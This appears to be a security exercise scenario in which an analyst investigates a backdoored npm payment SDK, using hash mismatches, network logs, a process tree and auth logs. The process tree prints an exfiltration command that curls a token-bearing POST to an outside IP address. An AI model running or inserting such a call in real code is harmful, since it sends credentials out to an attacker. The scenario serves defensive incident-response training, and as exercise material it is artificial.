## Full Supply Chain Compromise

You are a security analyst at a mid-sized fintech company. A threat intelligence feed flags one of your dependencies - `payment-sdk@4.1.2` - as potentially backdoored. You start investigating.

**Dependency check:**

```
payment-sdk@4.1.2
  SHA256 (registry):  a3f1c9e2b...d44f
  SHA256 (installed): 7b82e1d0a...991c   <-- MISMATCH
```

**Network logs from the past 30 days (app server):**

```
2024-03-01 08:44:12  app-server -> api.payments-cdn.net:443   [HTTPS]
2024-03-01 08:44:13  app-server -> 194.165.16.78:8080         [HTTP, unencrypted]
2024-03-01 08:44:13  POST /collect  body: {"h": "app-server-prod", "u": "svc_payment", "t": "eyJhbG..."}
2024-03-08 09:11:05  app-server -> 194.165.16.78:8080         [HTTP, unencrypted]
2024-03-08 09:11:05  POST /collect  body: {"h": "app-server-prod", "u": "svc_payment", "t": "eyJhbG..."}
```

**Process tree during SDK initialization:**

```
node (app)
  -> payment-sdk (npm module)
       -> child_process.exec("curl -s http://194.165.16.78:8080/collect -d ...")
```

**Auth logs (same period):**

```
2024-03-02 02:17:33  LOGIN SUCCESS  user=svc_payment  src=194.165.16.78  method=token
2024-03-09 01:58:11  LOGIN SUCCESS  user=svc_payment  src=194.165.16.78  method=token
```
